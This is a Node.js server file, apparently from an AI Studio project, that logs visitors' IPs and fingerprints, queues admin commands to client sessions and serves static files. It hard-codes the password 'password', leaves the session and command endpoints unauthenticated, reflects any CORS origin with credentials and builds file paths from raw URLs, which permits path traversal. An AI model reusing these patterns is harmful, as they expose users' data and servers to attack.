declare var process: any;
declare var require: any;
declare var __dirname: any;

// --- SERVER SIDE (Node.js) ---
(async () => {
  try {
    console.log('[Init] Starting server process...');
    const http = require('http');
    const fs = require('fs');
    const path = require('path');
    
    const PORT = parseInt(process.env.PORT || '8080', 10);
    
    // GCP/Production Persistence Config
    const DATA_DIR = process.env.DATA_DIR || '.';
    const DB_PATH = path.join(DATA_DIR, 'sessions_v7.json'); 
    
    let sessions: Record<string, any> = {};
    const adminCommands: Record<string, any> = {};
    const masterPassword = 'password';

    console.log(`[Init] Port: ${PORT}`);
    console.log(`[Init] Database Path: ${DB_PATH}`);

    // --- DIAGNOSTICS: Check Write Permissions ---
    try {
        if (DATA_DIR !== '.') {
             fs.mkdirSync(DATA_DIR, { recursive: true });
        }
        fs.accessSync(DATA_DIR, fs.constants.W_OK);
        console.log(`[Init] ✅ Write access confirmed for directory: ${DATA_DIR}`);
    } catch (err) {
        console.error(`[Init] ❌ WARNING: No write access to ${DATA_DIR}. Session persistence will fail! Check IAM roles.`, err);
    }

    // Load existing data
    try {
        if (fs.existsSync(DB_PATH)) {
            const raw = fs.readFileSync(DB_PATH, 'utf8');
            if (raw) {
                sessions = JSON.parse(raw);
                console.log(`[Init] Loaded ${Object.keys(sessions).length} sessions from disk.`);
            }
        } else {
            console.log('[Init] No existing database found. Creating new.');
            // Try to write immediately to test permissions
            fs.writeFileSync(DB_PATH, JSON.stringify({}, null, 2));
            console.log('[Init] ✅ Initial DB file created successfully.');
        }
    } catch (e) {
        console.error('[Init] ❌ DB Init Error (Check Permissions):', e);
        sessions = {};
    }

    // --- OPTIMIZED DB SAVE (Debounced + Async) ---
    let saveTimer: any = null;
    const saveDB = () => {
        if (saveTimer) clearTimeout(saveTimer);
        saveTimer = setTimeout(() => {
            fs.writeFile(DB_PATH, JSON.stringify(sessions, null, 2), (err: any) => {
                if (err) console.error('[Server] Async Save Failed:', err);
            });
        }, 200);
    };

    const readBody = (req: any): Promise<string> => {
        return new Promise((resolve, reject) => {
            let body = '';
            req.on('data', (chunk: any) => body += chunk);
            req.on('end', () => resolve(body));
            req.on('error', (err: any) => reject(err));
        });
    };

    const server = http.createServer(async (req: any, res: any) => {
        // CORS
        const origin = req.headers.origin || '*';
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
        res.setHeader('Access-Control-Allow-Credentials', 'true');

        if (req.method === 'OPTIONS') {
            res.writeHead(204);
            res.end();
            return;
        }

        const url = req.url.split('?')[0];

        // --- API ROUTES ---

        // 1. Sync State
        if (req.method === 'POST' && url === '/api/sync') {
            try {
                const body = await readBody(req);
                if (!body) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Empty body' }));
                    return;
                }

                let data;
                try { data = JSON.parse(body); } catch (e) {
                    res.writeHead(400); res.end(); return;
                }
                
                if (data.sessionId) {
                    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
                    
                    const existing = sessions[data.sessionId] || {};
                    sessions[data.sessionId] = { 
                        ...existing, 
                        ...data,
                        lastSeen: Date.now(),
                        ip: ip 
                    };
                    
                    // Update fingerprint IP
                    if (sessions[data.sessionId].fingerprint) {
                        sessions[data.sessionId].fingerprint.ip = ip;
                    } else {
                        sessions[data.sessionId].fingerprint = { ip };
                    }

                    saveDB();

                    const cmd = adminCommands[data.sessionId];
                    if (cmd) {
                        delete adminCommands[data.sessionId]; 
                        res.writeHead(200, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ status: 'ok', command: cmd }));
                        return;
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok' }));
            } catch (e) {
                console.error('[Sync] Error:', e);
                res.writeHead(500);
                res.end();
            }
            return;
        }

        // 2. Fetch Sessions
        if (req.method === 'GET' && url === '/api/sessions') {
            try {
                const list = Object.values(sessions).sort((a: any, b: any) => (b.lastSeen || 0) - (a.lastSeen || 0));
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(list));
            } catch(e) {
                 res.writeHead(500); res.end('[]');
            }
            return;
        }

        // 3. Admin Command
        if (req.method === 'POST' && url === '/api/command') {
            try {
                const body = await readBody(req);
                const { sessionId, action, payload } = JSON.parse(body);
                if (sessionId && action) {
                    adminCommands[sessionId] = { action, payload };
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ status: 'queued' }));
                } else {
                    res.writeHead(400); res.end();
                }
            } catch (e) {
                res.writeHead(500); res.end();
            }
            return;
        }

        // 4. Gate Unlock
        if (req.method === 'POST' && url === '/api/gate-unlock') {
            try {
                const body = await readBody(req);
                const { password } = JSON.parse(body);
                if (password === masterPassword) {
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true }));
                } else {
                    res.writeHead(401, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: false }));
                }
            } catch (e) {
                res.writeHead(500); res.end();
            }
            return;
        }

        // --- STATIC FILES ---
        let filePath = '/app/static' + req.url;
        if (filePath === '/app/static/') filePath = '/app/static/index.html';

        const extname = path.extname(filePath);
        let contentType = 'text/html';
        switch (extname) {
            case '.js': contentType = 'text/javascript'; break;
            case '.css': contentType = 'text/css'; break;
            case '.json': contentType = 'application/json'; break;
            case '.png': contentType = 'image/png'; break;
            case '.jpg': contentType = 'image/jpg'; break;
            case '.svg': contentType = 'image/svg+xml'; break;
        }

        fs.readFile(filePath, (error: any, content: any) => {
            if (error) {
                if(error.code == 'ENOENT'){
                    fs.readFile('./index.html', (error: any, content: any) => {
                        res.writeHead(200, { 'Content-Type': 'text/html' });
                        res.end(content, 'utf-8');
                    });
                } else {
                    res.writeHead(500);
                    res.end('Server Error: '+error.code);
                }
            } else {
                res.writeHead(200, { 'Content-Type': contentType });
                res.end(content, 'utf-8');
            }
        });
    });

    server.listen(PORT, '0.0.0.0', () => {
        console.log(`[Server] ✅ Running and listening on ${PORT}`);
    });

  } catch (e) {
    console.error('Fatal Server Error:', e);
    process.exit(1);
  }
})();

// AI Studio always uses an `index.tsx` file for all project types.